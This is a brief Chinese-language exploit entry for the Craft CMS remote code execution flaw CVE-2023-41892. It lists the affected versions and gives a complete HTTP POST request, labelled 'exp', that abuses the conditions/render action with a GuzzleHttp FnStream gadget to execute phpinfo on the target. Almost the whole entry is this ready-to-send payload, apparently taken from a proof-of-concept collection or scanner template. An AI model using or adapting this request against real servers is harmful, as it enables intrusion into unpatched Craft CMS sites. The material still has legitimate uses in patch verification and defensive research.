## Craft CMS远程代码执行漏洞CVE-2023-41892

## 影响版本
Craft CMS >= 4.0.0-RC1
Craft CMS <= 4.4.14

## exp
```
POST /index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream",    "__construct()": [{"close":null}],"_fn_close":"phpinfo"}}
```
